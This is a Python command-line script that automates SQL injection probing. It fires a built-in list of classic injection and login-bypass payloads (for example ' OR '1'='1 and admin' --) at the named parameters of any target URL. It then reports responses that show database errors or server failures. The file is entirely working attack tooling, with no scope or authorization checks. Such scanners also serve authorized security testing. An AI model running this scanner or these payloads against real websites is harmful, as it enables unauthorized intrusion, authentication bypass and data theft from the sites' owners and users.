import requests
from urllib.parse import urljoin
import argparse

# List of common SQL Injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR '1'='1' #",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 'a'='a",
    "') OR ('a'='a",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "\" OR 1=1 --",
]

def scan_sql_injection(url, params, method="GET", cookies=None):
    for param in params:
        for payload in payloads:
            # Create a copy of the parameters and inject the payload
            test_params = params.copy()
            test_params[param] = payload
            try:
                if method.upper() == "POST":
                    response = requests.post(url, data=test_params, cookies=cookies)
                else:
                    response = requests.get(url, params=test_params, cookies=cookies)
                
                print(f"Testing {param} with payload: {payload}")
                print(f"URL: {response.url}")
                
                # Check if the response indicates a potential SQL Injection vulnerability
                if ("error" in response.text.lower() or "syntax" in response.text.lower() or
                    "warning" in response.text.lower() or "mysql" in response.text.lower() or
                    "native client" in response.text.lower() or response.status_code == 500):
                    print(f"Potential SQL Injection vulnerability found with payload: {payload}")
                    print(f"Parameter: {param}")
                    print(f"URL: {response.url}")
                    print("="*50)
                else:
                    print(f"No vulnerability found with payload: {payload} on parameter: {param}")
                    print("="*50)
            except requests.RequestException as e:
                print(f"Error during request: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple SQL Injection Scanner")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("params", nargs="+", help="Parameters to test (e.g., 'param1 param2')")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method to use")
    parser.add_argument("--cookies", help="Cookies to include in the request (key=value;key2=value2)")

    args = parser.parse_args()
    
    target_url = args.url
    parameters = {param: "" for param in args.params}

    cookies = None
    if args.cookies:
        cookies = dict(item.split("=") for item in args.cookies.split(";"))

    # Perform the scan
    scan_sql_injection(target_url, parameters, args.method, cookies)
